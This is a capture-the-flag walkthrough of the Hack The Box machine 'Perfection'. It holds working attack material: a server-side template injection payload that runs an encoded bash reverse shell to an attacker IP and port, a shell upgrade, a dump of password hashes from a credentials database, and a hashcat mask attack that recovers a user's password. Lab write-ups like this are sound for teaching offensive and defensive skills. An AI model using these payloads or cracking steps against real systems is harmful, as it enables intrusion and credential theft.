
## NMAP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-15 18:47 EDT
Nmap scan report for perfection.htb (10.10.11.253)
Host is up (0.059s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.41 seconds


## VULNARABILITY
 ssti
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

The use of hURL to encode and decode payloads showcases the manipulation of data to exploit web application vulnerabilities. The payload crafted for the Weighted Grade Calculator application is designed to execute a reverse shell command, taking advantage of any potential server-side code execution vulnerabilities.




https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a

## Base64-Encoded
┌──(kali㉿kali)-[~/Machine/Perfection]
└─$ hURL -B "bash -i >& /dev/tcp/10.10.16.94/4444 0>&1"

Original       :: bash -i >& /dev/tcp/10.10.16.94/4444 0>&1
base64 ENcoded :: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45NC80NDQ0IDA+JjE=


 
## URL-encoded 
┌──(kali㉿kali)-[~/Machine/Perfection]
└─$ hURL -U "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45NC80NDQ0IDA+JjE="

Original    :: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45NC80NDQ0IDA+JjE=
URL ENcoded :: YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNi45NC80NDQ0IDA%2BJjE%3D




payload 
a%0A<%25%3dsystem("echo+<reverseshelle>|+base64+-d+|+bash");%25>1

a%0A<%25%3dsystem("echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNi45NC80NDQ0IDA%2BJjE%3D|+base64+-d+|+bash");%25>1


## Privialge escalation
upgarde the shell 
python3 -c 'import pty;pty.spawn("/bin/bash")'


find the hash
──(kali㉿kali)-[~/Machine/Perfection]
└─$ strings pupilpath_credentials.db 
SQLite format 3
tableusersusers
CREATE TABLE users (
id INTEGER PRIMARY KEY,
name TEXT,
password TEXT
Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8S
David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87aP
Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393O
Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57Q
Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f

###Info Password generator

susan@perfection:/var/mail$ cat susan
cat susan
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
#### Try crack use hashcat

Crack
┌──(kali㉿kali)-[~/Machine/Perfection]
└─$ hashcat -m 1400 -a 3 hash.txt susan_nasus_?d?d?d?d?d?d?d?d?d   

Show
┌──(kali㉿kali)-[~/Machine/Perfection]
└─$ hashcat -m 1400 -a 3 hash.txt --show                        
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210


## FLAGS

User d2a6d6d2d24d939bcbc3a431ae3ad814

Passwd hash:Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f text:!(3(r3@m..*7¡Vamos!




